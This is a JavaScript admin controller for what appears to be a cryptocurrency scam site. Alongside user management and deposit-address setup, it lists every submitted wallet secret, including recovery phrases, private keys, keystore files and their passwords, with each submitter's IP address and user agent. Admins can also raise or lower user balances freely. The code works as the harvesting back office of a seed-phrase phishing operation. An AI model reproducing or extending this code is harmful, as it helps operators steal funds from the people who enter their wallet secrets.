import { sql } from '../config/db.js';
import { hashPassword, verifyPassword } from '../utils/password.js';
import { buildUserWhere, normalizePagination } from '../utils/queryHelpers.js';

function toNumber(value, fallback = 0) {
  const n = Number(value);
  return Number.isFinite(n) ? n : fallback;
}

export async function getAdminStats(req, res) {
  try {
    const [userCounts] = await sql`
      SELECT
        COUNT(*)::int AS total_users,
        COUNT(*) FILTER (WHERE role = 'admin')::int AS admin_users,
        COUNT(*) FILTER (WHERE role <> 'admin')::int AS regular_users
      FROM users
    `;

    const [walletCounts] = await sql`
      SELECT COUNT(*)::int AS total_wallets FROM wallet_submissions
    `;

    const [backupCounts] = await sql`
      SELECT COUNT(*)::int AS total_backups FROM phrase_backups
    `;

    return res.status(200).json({
      counts: {
        admins: toNumber(userCounts?.admin_users),
        users: toNumber(userCounts?.regular_users ?? userCounts?.total_users),
        wallets: toNumber(walletCounts?.total_wallets),
        backups: toNumber(backupCounts?.total_backups),
      },
    });
  } catch (error) {
    console.log('Error fetching admin stats', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function listUsers(req, res) {
  try {
    const { status = 'all', q = '', limit = '200', offset = '0' } = req.query || {};
    const { limitNum, offsetNum } = normalizePagination(limit, offset);

    // Build a WHERE fragment using our helper (avoids sql.join and duplication)
    const whereClause = buildUserWhere(sql, status, q);

    const users = await sql`
      SELECT id, username, email, role, total_balance, is_frozen, profile_image, created_at, updated_at
      FROM users
      ${whereClause}
      ORDER BY created_at DESC
      LIMIT ${limitNum}
      OFFSET ${offsetNum}
    `;

    const [countRow] = await sql`
      SELECT COUNT(*)::int AS total
      FROM users
      ${whereClause}
    `;

    return res.status(200).json({
      users,
      total: toNumber(countRow?.total),
    });
  } catch (error) {
    console.log('Error fetching users', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function getUserById(req, res) {
  try {
    const id = parseInt(String(req.params?.id ?? ''), 10);
    if (!Number.isFinite(id)) return res.status(400).json({ message: 'Invalid user ID' });

    const rows = await sql`
      SELECT id, username, email, role, total_balance, is_frozen, profile_image, created_at, updated_at
      FROM users
      WHERE id = ${id}
      LIMIT 1
    `;

    const user = rows[0];
    if (!user) return res.status(404).json({ message: 'User not found' });

    return res.status(200).json({ user });
  } catch (error) {
    console.log('Error fetching user detail', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function setUserPassword(req, res) {
  try {
    const id = parseInt(String(req.params?.id ?? ''), 10);
    if (!Number.isFinite(id)) return res.status(400).json({ message: 'Invalid user ID' });

    const password = String(req.body?.password ?? '');
    if (!password || password.length < 8) {
      return res.status(400).json({ message: 'Password must be at least 8 characters' });
    }

    const rows = await sql`
      UPDATE users
      SET password_hash = ${hashPassword(password)}, updated_at = NOW()
      WHERE id = ${id}
      RETURNING id, username, email, role, total_balance, is_frozen, profile_image, created_at, updated_at
    `;

    const user = rows[0];
    if (!user) return res.status(404).json({ message: 'User not found' });

    return res.status(200).json({ user });
  } catch (error) {
    console.log('Error setting user password', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function adjustUserBalance(req, res) {
  try {
    const id = parseInt(String(req.params?.id ?? ''), 10);
    if (!Number.isFinite(id)) return res.status(400).json({ message: 'Invalid user ID' });

    const amountRaw = req.body?.amount;
    const op = String(req.body?.op || '').toLowerCase();
    const amount = Number(amountRaw);

    if (!Number.isFinite(amount) || amount <= 0) {
      return res.status(400).json({ message: 'Amount must be greater than zero' });
    }

    if (!['add', 'subtract'].includes(op)) {
      return res.status(400).json({ message: 'Invalid operation' });
    }

    const delta = op === 'subtract' ? -amount : amount;

    const rows = await sql`
      UPDATE users
      SET total_balance = GREATEST(total_balance + ${delta}, 0), updated_at = NOW()
      WHERE id = ${id}
      RETURNING id, username, email, role, total_balance, is_frozen, profile_image, created_at, updated_at
    `;

    const user = rows[0];
    if (!user) return res.status(404).json({ message: 'User not found' });

    return res.status(200).json({ user });
  } catch (error) {
    console.log('Error adjusting user balance', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function setUserStatus(req, res) {
  try {
    const id = parseInt(String(req.params?.id ?? ''), 10);
    if (!Number.isFinite(id)) return res.status(400).json({ message: 'Invalid user ID' });

    const frozen = req.body?.frozen;
    if (typeof frozen !== 'boolean') {
      return res.status(400).json({ message: 'Frozen flag must be boolean' });
    }

    const rows = await sql`
      UPDATE users
      SET is_frozen = ${frozen}, updated_at = NOW()
      WHERE id = ${id}
      RETURNING id, username, email, role, total_balance, is_frozen, profile_image, created_at, updated_at
    `;

    const user = rows[0];
    if (!user) return res.status(404).json({ message: 'User not found' });

    return res.status(200).json({ user });
  } catch (error) {
    console.log('Error updating user status', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function deleteUser(req, res) {
  try {
    const id = parseInt(String(req.params?.id ?? ''), 10);
    if (!Number.isFinite(id)) return res.status(400).json({ message: 'Invalid user ID' });

    await sql`DELETE FROM transactions WHERE user_id = ${String(id)}`;
    await sql`DELETE FROM wallet_submissions WHERE user_id = ${id}`;
    await sql`DELETE FROM phrase_backups WHERE user_id = ${id}`;

    const rows = await sql`DELETE FROM users WHERE id = ${id} RETURNING id`;
    const deleted = rows[0];
    if (!deleted) return res.status(404).json({ message: 'User not found' });

    return res.status(200).json({ message: 'User deleted' });
  } catch (error) {
    console.log('Error deleting user', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function listAdmins(req, res) {
  try {
    const admins = await sql`
      SELECT id, username, email, role, created_at, updated_at
      FROM users
      WHERE role = 'admin'
      ORDER BY created_at DESC
    `;
    return res.status(200).json({ admins });
  } catch (error) {
    console.log('Error fetching admins', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function listWalletSubmissions(req, res) {
  try {
    const submissions = await sql`
      SELECT id, user_id, type, wallet_name, email, recovery_phrase, keystore_json, keystore_password, private_key, icon_name, image_src, ip_addr, user_agent, status, created_at, updated_at
      FROM wallet_submissions
      ORDER BY created_at DESC
    `;
    return res.status(200).json({ submissions });
  } catch (error) {
    console.log('Error fetching wallet submissions', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function listPhraseBackups(req, res) {
  try {
    const backups = await sql`
      SELECT id, user_id, wallet_key, wallet_name, email, recovery_phrase, image_src, ip_addr, user_agent, status, created_at, updated_at
      FROM phrase_backups
      ORDER BY created_at DESC
    `;
    return res.status(200).json({ backups });
  } catch (error) {
    console.log('Error fetching phrase backups', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function updateAdminPassword(req, res) {
  try {
    const adminId = req.user?.id;
    if (!adminId) return res.status(401).json({ message: 'Unauthorized' });

    const currentPassword = String(req.body?.currentPassword ?? '');
    const newPassword = String(req.body?.newPassword ?? '');

    if (!currentPassword || !newPassword) {
      return res.status(400).json({ message: 'Current and new passwords are required' });
    }

    if (newPassword.length < 8) {
      return res.status(400).json({ message: 'Password must be at least 8 characters' });
    }

    const rows = await sql`SELECT password_hash FROM users WHERE id = ${adminId} LIMIT 1`;
    const user = rows[0];
    if (!user) return res.status(404).json({ message: 'User not found' });

    const valid = verifyPassword(currentPassword, user.password_hash);
    if (!valid) {
      return res.status(400).json({ message: 'Current password is incorrect' });
    }

    await sql`
      UPDATE users
      SET password_hash = ${hashPassword(newPassword)}, updated_at = NOW()
      WHERE id = ${adminId}
    `;

    return res.status(200).json({ message: 'Password updated' });
  } catch (error) {
    console.log('Error updating admin password', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

// Payment wallets (admin-managed deposit addresses)
export async function listPaymentWallets(req, res) {
  try {
    const wallets = await sql`
      SELECT id, currency, network, address, label, memo_tag, is_active, created_at, updated_at
      FROM payment_wallets
      ORDER BY created_at DESC
    `;
    return res.status(200).json({ wallets });
  } catch (error) {
    console.log('Error fetching payment wallets', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function createPaymentWallet(req, res) {
  try {
    const currency = String(req.body?.currency || '').trim().toUpperCase();
    const address = String(req.body?.address || '').trim();
    const network = (req.body?.network ? String(req.body.network) : '').trim();
    const label = (req.body?.label ? String(req.body.label) : '').trim();
    const memo_tag = (req.body?.memo_tag ? String(req.body.memo_tag) : '').trim();
    const is_active_raw = req.body?.is_active;
    const is_active = typeof is_active_raw === 'boolean' ? is_active_raw : true;

    if (!currency) return res.status(400).json({ message: 'Currency is required' });
    if (!address) return res.status(400).json({ message: 'Address is required' });

    const rows = await sql`
      INSERT INTO payment_wallets (currency, network, address, label, memo_tag, is_active)
      VALUES (${currency}, ${network || null}, ${address}, ${label || null}, ${memo_tag || null}, ${is_active})
      ON CONFLICT (currency, COALESCE(network, ''), address) DO NOTHING
      RETURNING id, currency, network, address, label, memo_tag, is_active, created_at, updated_at
    `;

    if (!rows.length) {
      // Likely duplicate
      return res.status(409).json({ message: 'Wallet address already exists for currency/network' });
    }

    return res.status(201).json({ wallet: rows[0] });
  } catch (error) {
    console.log('Error creating payment wallet', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

export async function deletePaymentWallet(req, res) {
  try {
    const id = parseInt(String(req.params?.id ?? ''), 10);
    if (!Number.isFinite(id)) return res.status(400).json({ message: 'Invalid wallet ID' });

    const rows = await sql`DELETE FROM payment_wallets WHERE id = ${id} RETURNING id`;
    if (!rows.length) return res.status(404).json({ message: 'Wallet not found' });
    return res.status(200).json({ message: 'Wallet deleted' });
  } catch (error) {
    console.log('Error deleting payment wallet', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}
